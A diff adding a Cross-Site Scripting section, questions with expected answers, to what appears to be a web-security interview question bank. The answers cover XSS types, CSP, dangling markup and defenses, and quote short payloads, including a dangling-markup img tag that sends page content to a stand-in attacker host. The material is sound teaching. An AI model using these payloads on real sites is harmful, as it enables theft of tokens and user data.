@@ -59,6 +59,33 @@
 23. Consider a scenario where a subdomain (e.g., subdomain.vuln-site.com) of a website (vuln-site.com) is vulnerable to an XSS attack. The main site has a CORS policy with Access-Control-Allow-Origin set to the subdomain and Access-Control-Allow-Credentials: true. Assuming that the cookies on the subdomain are set with the HttpOnly flag, if an XSS attack on the subdomain triggers an AJAX request to vuln-site.com to access sensitive information that relies on the subdomain's cookies, will the HttpOnly flag prevent the transmission of these cookies in the request?  
 24. How to prevent CORS-based attacks?  
 
+**Cross-Site Scripting (XSS)**:
+1. What is cross-site scripting (XSS)? 
+2. What are the three main types of XSS attacks? 
+3. What is cross-site scripting contexts? 
+4. `<a href="#" onclick="... var input='controllable data here'; ...">` contains an xss where the application blocks or escapes quote characters. What payload can be used in this case and why?  
+5. What are JavaScript template literals and how would you trigger an xss?
+6. What is client-side template injection? 
+7. What is one way you can XSS in hidden input fields?  
+8. What is the difference between reflected XSS and stored XSS?
+9. What is the difference between reflected XSS and self-XSS?
+10. What can XSS be used for?  
+11. What is DOM-based cross-site scripting? 
+12. How are DOM-based XSS attack delivered?
+13. What is the most common source for DOM XSS?
+14. What is CSP (content security policy)?
+15. Why should CSP not allow scripts from external domains such as content delivery networks (CDNs) that do not use per-customer URLs (e.g.`ajax.googleapis.com`)? 
+16. In addition to whitelisting specific domains, content security policy also provides what two other ways of specifying trusted resources? 
+17. What are some dangerous CSP configurations?
+18. What is dangling markup injection?  
+19. What is the consequence of dangling markup injection?
+20. Is dangling markup only restricted to a few attributes? 
+21. How to prevent dangling markup attacks? 
+22. How can an attacker exploit a strict Content Security Policy (CSP) like default-src 'none'; base-uri 'none'; using the HTML `<base>` tag, and what are the key steps in this attack method?  
+23. How is CSP with policy injection performed?
+24. How to protect against clickjacking using CSP?  
+25. How to prevent XSS attacks?
+
 
 ### Web Security
 
@@ -283,3 +310,113 @@ Manipulating the transport_url via a query parameter in the website URL. For exa
 
    * Proper configuration of cross-origin requests: If a web resource contains sensitive information, the origin should be properly specified in the Access-Control-Allow-Origin header.
    * Only allow trusted sites: Origins specified in the Access-Control-Allow-Origin header should only be sites that are trusted.
+
+
+#### Cross-Site Scripting (XSS)
+
+1. What is cross-site scripting (XSS)?  
+**Expected Answer**: Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.
+
+1. What are the three main types of XSS attacks?  
+**Expected Answer**:  
+
+   * Reflected XSS: where the malicious script comes from the current HTTP request.
+   * Stored XSS: where the malicious script comes from the website's servers, such as a database.
+   * DOM-based XSS: where the vulnerability exists in client-side code rather than server-side code.
+
+1. What is cross-site scripting contexts?  
+**Expected Answer**:  
+
+   * The location within the response where attacker-controllable data appears.
+   * Any input validation or other processing that is being performed on that data by the application.
+
+1. `<a href="#" onclick="... var input='controllable data here'; ...">` contains an xss where the application blocks or escapes quote characters. What payload can be used in this case and why?  
+**Expected Answer**: The `&apos;-alert(document.domain)-&apos;` payload will work as the `&apos;` sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.
+
+1. What are JavaScript template literals and how would you trigger an xss?  
+**Expected Answer**: JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax. When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed. \<script\> var input = `${alert(document.domain)}`; \</script\>
+
+1. What is client-side template injection?  
+**Expected Answer**: Client-side template injection vulnerabilities arise when applications using a client-side template framework (AngularJS) dynamically embed user input in web pages. When rendering a page, the framework scans it for template expressions and executes any that it encounters. An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack.
+
+1. What is one way you can XSS in hidden input fields?  
+**Expected Answer**: XSS in hidden inputs is frequently very difficult to exploit because typical JavaScript events like onmouseover and onfocus can't be triggered due to the element being invisible. The hidden input can be activated via an access key. The accesskey global attribute provides a hint for generating a keyboard shortcut for the current element. This means if you set accesskey="s" then depending on the browser (e.g. Firefox is Alt + Shift + key) the combination of Alt + Shift + s would trigger the hidden input field.
+
+1. What is the difference between reflected XSS and stored XSS?  
+**Expected Answer**: Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the immediate response in an unsafe way. With stored XSS, the application instead stores the input and embeds it into a later response in an unsafe way.
+
+1. What is the difference between reflected XSS and self-XSS?  
+**Expected Answer**: Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser. Delivering a self-XSS attack normally involves socially engineering the victim to paste some attacker-supplied input into their browser. As such, it is normally considered to be a lame, low-impact issue.
+
+1. What can XSS be used for?  
+**Expected Answer**: 
+
+   * Impersonate or masquerade as the victim user.
+   * Carry out any action that the user is able to perform.
+   * Read any data that the user is able to access.
+   * Capture the user's login credentials: creating a password input, reading out the auto-filled password from password managers, and sending it to your own domain.
+   * Perform virtual defacement of the web site.
+   * Inject trojan functionality into the web site.
+
+1. What is DOM-based cross-site scripting?  
+**Expected Answer**: DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.
+
+1. How are DOM-based XSS attack delivered?  
+**Expected Answer**: To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.
+
+1. What is the most common source for DOM XSS?  
+**Expected Answer**: The most common source for DOM XSS is the URL, which is typically accessed with the window.location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL.
+
+1. What is CSP (content security policy)?    
+**Expected Answer**: CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages. To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.
+
+1. Why should CSP not allow scripts from external domains such as content delivery networks (CDNs) that do not use per-customer URLs (e.g.`ajax.googleapis.com`)?  
+**Expected Answer**: They should not be trusted, because third parties can get content onto their domains.
+
+1. In addition to whitelisting specific domains, content security policy also provides what two other ways of specifying trusted resources?  
+**Expected Answer**: Nonces and hashes:
+
+   * The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker.
+   * The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value that is specified in the directive.
+
+1. What are some dangerous CSP configurations?  
+**Expected Answer**: 
+
+   * Allowing `unsafe-inline` in `script-src`: permits inline JavaScript (xss)
+   * Using `unsafe-eval` in `script-src`: dynamic script execution
+   * Overly Broad Source Directives like `script-src *`, `img-src *`: use `img` elements to make requests to external servers in order to disclose CSRF tokens
+
+1. What is dangling markup injection?  
+**Expected Answer**: Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible. Suppose that the application does not filter or escape the > or " characters. An attacker can use the `">` syntax to break out of the quoted attribute value (e.g. `<input value="CONTROLLABLE DATA`) and the enclosing tag, and return to an HTML context. Normally, an XSS would be performed, but due to CSP, input filters, or other obstacles it is not possible. It might still be possible to deliver a dangling markup injection attack using a payload like the following: `"><img src='//attacker-website.com?`. This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the src attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.
+
+1. What is the consequence of dangling markup injection?  
+**Expected Answer**: The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.
+
+1. Is dangling markup only restricted to a few attributes?  
+**Expected Answer**: No, any attribute that makes an external request can be used for dangling markup.
+
+1. How to prevent dangling markup attacks?  
+**Expected Answer**: You can prevent dangling markup attacks using the same general defenses for preventing cross-site scripting, by encoding data on output and validating input on arrival. You can also mitigate some dangling markup attacks using content security policy (CSP). For example, you can prevent some (but not all) attacks, using a policy that prevent tags like img from loading external resources. The Chrome browser has decided to tackle dangling markup attacks by preventing tags like img from defining URLs containing raw characters such as angle brackets and newlines. This will prevent attacks since the data that would otherwise be captured will generally contain those raw characters, so the attack is blocked.
+
+1. How can an attacker exploit a strict Content Security Policy (CSP) like default-src 'none'; base-uri 'none'; using the HTML `<base>` tag, and what are the key steps in this attack method?  
+**Expected Answer**: By injecting a malformed `<base>` tag into the web page, if there is an HTML injection. The attack involves leaving the target attribute of the `<base>` tag open, causing the browser to misinterpret subsequent HTML code as part of this attribute (e.g. `<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="blah`). This results in the manipulation of the window's target name, where the subsequent markup of the page (which could include sensitive data like CSRF tokens) is appended to this name. When a user clicks on a hyperlink, they are redirected to an attacker-controlled page with this window name, allowing the attacker to access the exposed data. The window.name property is persistent across page navigations within the same tab, and it's accessible cross-domain, making it a vector for data exfiltration.
+
+1. How is CSP with policy injection performed?  
+**Expected Answer**: A website that reflects input into the actual policy, most likely in a `report-uri` directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. Usually, this `report-uri` directive is the final one in the list. This means you will need to overwrite existing directives in order to exploit this vulnerability and bypass the policy.
+
+1. How to protect against clickjacking using CSP?  
+**Expected Answer**: `frame-ancestors 'self'` directive will only allow the page to be framed by other pages from the same origin. `frame-ancestors 'none'` directive will prevent framing altogether. Using content security policy to prevent clickjacking is more flexible than using the X-Frame-Options header because you can specify multiple domains and use wildcards. CSP also validates each frame in the parent frame hierarchy, whereas X-Frame-Options only validates the top-level frame. Using CSP to protect against clickjacking attacks is recommended. You can also combine this with the X-Frame-Options header to provide protection on older browsers that don't support CSP, such as Internet Explorer.
+
+1. How to prevent XSS attacks?  
+**Expected Answer**: 
+
+   * Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
+   * Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
+   * Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
+   * Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
+
+
+
+
+
+
